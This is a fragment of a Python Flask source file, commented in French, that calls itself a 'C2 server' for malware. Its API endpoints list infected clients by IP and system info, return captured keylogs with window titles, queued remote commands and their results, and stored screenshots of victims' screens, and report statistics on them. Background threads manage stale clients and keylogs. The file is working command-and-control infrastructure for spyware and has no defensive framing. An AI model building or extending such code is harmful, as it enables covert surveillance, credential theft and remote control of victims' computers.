cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()

# AJOUT: Thread de nettoyage des keylogs
keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
keylog_cleanup_thread.start()

# ============================================
# API ENDPOINTS FOR DATABASE QUERIES
# ============================================

@app.route('/api/database/clients', methods=['GET'])
def api_get_database_clients():
    """Récupère tous les clients depuis la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT client_id, ip_address, system_info, 
                       first_seen, last_seen, checkin_count, is_online
                FROM clients
                ORDER BY last_seen DESC
                LIMIT 100
            """)
            rows = cur.fetchall()
            
            clients_list = []
            for row in rows:
                clients_list.append({
                    'client_id': row[0],
                    'ip_address': row[1],
                    'system_info': row[2],
                    'first_seen': row[3],
                    'last_seen': row[4],
                    'checkin_count': row[5],
                    'is_online': row[6]
                })
            
            return jsonify({
                'success': True,
                'total': len(clients_list),
                'clients': clients_list
            })
    
    except Exception as e:
        print(f"[API] Error fetching clients: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/database/keylogs', methods=['GET'])
def api_get_database_keylogs():
    """Récupère les keylogs depuis la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        client_id = request.args.get('client_id')
        limit = int(request.args.get('limit', 100))
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            
            if client_id:
                cur.execute("""
                    SELECT id, client_id, window_title, keylog_data, created_at
                    FROM keylogs
                    WHERE client_id = %s
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (client_id, limit))
            else:
                cur.execute("""
                    SELECT id, client_id, window_title, keylog_data, created_at
                    FROM keylogs
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (limit,))
            
            rows = cur.fetchall()
            
            keylogs_list = []
            for row in rows:
                keylogs_list.append({
                    'id': row[0],
                    'client_id': row[1],
                    'window_title': row[2],
                    'keylog_data': row[3],
                    'created_at': row[4]
                })
            
            return jsonify({
                'success': True,
                'total': len(keylogs_list),
                'keylogs': keylogs_list
            })
    
    except Exception as e:
        print(f"[API] Error fetching keylogs: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/database/commands', methods=['GET'])
def api_get_database_commands():
    """Récupère les commandes depuis la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        client_id = request.args.get('client_id')
        limit = int(request.args.get('limit', 100))
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            
            if client_id:
                cur.execute("""
                    SELECT command_id, client_id, action, command_data, 
                           created_at, status
                    FROM commands
                    WHERE client_id = %s
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (client_id, limit))
            else:
                cur.execute("""
                    SELECT command_id, client_id, action, command_data, 
                           created_at, status
                    FROM commands
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (limit,))
            
            rows = cur.fetchall()
            
            commands_list = []
            for row in rows:
                commands_list.append({
                    'command_id': row[0],
                    'client_id': row[1],
                    'action': row[2],
                    'command_data': row[3],
                    'created_at': row[4],
                    'status': row[5]
                })
            
            return jsonify({
                'success': True,
                'total': len(commands_list),
                'commands': commands_list
            })
    
    except Exception as e:
        print(f"[API] Error fetching commands: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/database/command_results', methods=['GET'])
def api_get_database_command_results():
    """Récupère les résultats de commandes depuis la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        command_id = request.args.get('command_id')
        limit = int(request.args.get('limit', 100))
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            
            if command_id:
                cur.execute("""
                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
                           c.client_id, c.action
                    FROM command_results cr
                    JOIN commands c ON cr.command_id = c.command_id
                    WHERE cr.command_id = %s
                    ORDER BY cr.created_at DESC
                """, (command_id,))
            else:
                cur.execute("""
                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
                           c.client_id, c.action
                    FROM command_results cr
                    JOIN commands c ON cr.command_id = c.command_id
                    ORDER BY cr.created_at DESC
                    LIMIT %s
                """, (limit,))
            
            rows = cur.fetchall()
            
            results_list = []
            for row in rows:
                results_list.append({
                    'id': row[0],
                    'command_id': row[1],
                    'result_data': row[2],
                    'created_at': row[3],
                    'client_id': row[4],
                    'action': row[5]
                })
            
            return jsonify({
                'success': True,
                'total': len(results_list),
                'results': results_list
            })
    
    except Exception as e:
        print(f"[API] Error fetching command results: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/database/screenshots', methods=['GET'])
def api_get_database_screenshots():
    """Récupère les métadonnées de screenshots depuis la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        client_id = request.args.get('client_id')
        limit = int(request.args.get('limit', 50))
        include_data = request.args.get('include_data', 'false').lower() == 'true'
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            
            if include_data:
                select_fields = "id, client_id, filename, width, height, quality, size_kb, screenshot_data, created_at"
            else:
                select_fields = "id, client_id, filename, width, height, quality, size_kb, created_at"
            
            if client_id:
                cur.execute(f"""
                    SELECT {select_fields}
                    FROM screenshots
                    WHERE client_id = %s
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (client_id, limit))
            else:
                cur.execute(f"""
                    SELECT {select_fields}
                    FROM screenshots
                    ORDER BY created_at DESC
                    LIMIT %s
                """, (limit,))
            
            rows = cur.fetchall()
            
            screenshots_list = []
            for row in rows:
                screenshot = {
                    'id': row[0],
                    'client_id': row[1],
                    'filename': row[2],
                    'width': row[3],
                    'height': row[4],
                    'quality': row[5],
                    'size_kb': row[6],
                    'created_at': row[7 if include_data else 7]
                }
                if include_data:
                    screenshot['screenshot_data'] = row[7]
                
                screenshots_list.append(screenshot)
            
            return jsonify({
                'success': True,
                'total': len(screenshots_list),
                'screenshots': screenshots_list
            })
    
    except Exception as e:
        print(f"[API] Error fetching screenshots: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/database/stats', methods=['GET'])
def api_get_database_stats():
    """Récupère les statistiques globales de la base de données"""
    try:
        if not USE_DATABASE:
            return jsonify({"error": "Database not configured"}), 400
        
        with get_db_connection() as conn:
            cur = conn.cursor()
            
            # Total clients
            cur.execute("SELECT COUNT(*) FROM clients")
            total_clients = cur.fetchone()[0]
            
            # Online clients
            cur.execute("SELECT COUNT(*) FROM clients WHERE is_online = true")
            online_clients = cur.fetchone()[0]
            
            # Total keylogs
            cur.execute("SELECT COUNT(*) FROM keylogs")
            total_keylogs = cur.fetchone()[0]
            
            # Total commands
            cur.execute("SELECT COUNT(*) FROM commands")
            total_commands = cur.fetchone()[0]
            
            # Pending commands
            cur.execute("SELECT COUNT(*) FROM commands WHERE status = 'pending'")
            pending_commands_count = cur.fetchone()[0]
            
            # Total command results
            cur.execute("SELECT COUNT(*) FROM command_results")
            total_results = cur.fetchone()[0]
            
            # Total screenshots
            cur.execute("SELECT COUNT(*) FROM screenshots")
            total_screenshots = cur.fetchone()[0]
            
            return jsonify({
                'success': True,
                'stats': {
                    'clients': {
                        'total': total_clients,
                        'online': online_clients,
                        'offline': total_clients - online_clients
                    },
                    'keylogs': {
                        'total': total_keylogs
                    },
                    'commands': {
                        'total': total_commands,
                        'pending': pending_commands_count,
                        'completed': total_commands - pending_commands_count
                    },
                    'results': {
                        'total': total_results
                    },
                    'screenshots': {
                        'total': total_screenshots
                    }
                }
            })
    
    except Exception as e:
        print(f"[API] Error fetching stats: {e}")
        return jsonify({'error': str(e)}), 500


@app.before_request
def before_request():
    print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")

@app.after_request
def after_request(response):
    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
    return response



#Store server start time
app.start_time = time.time()



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)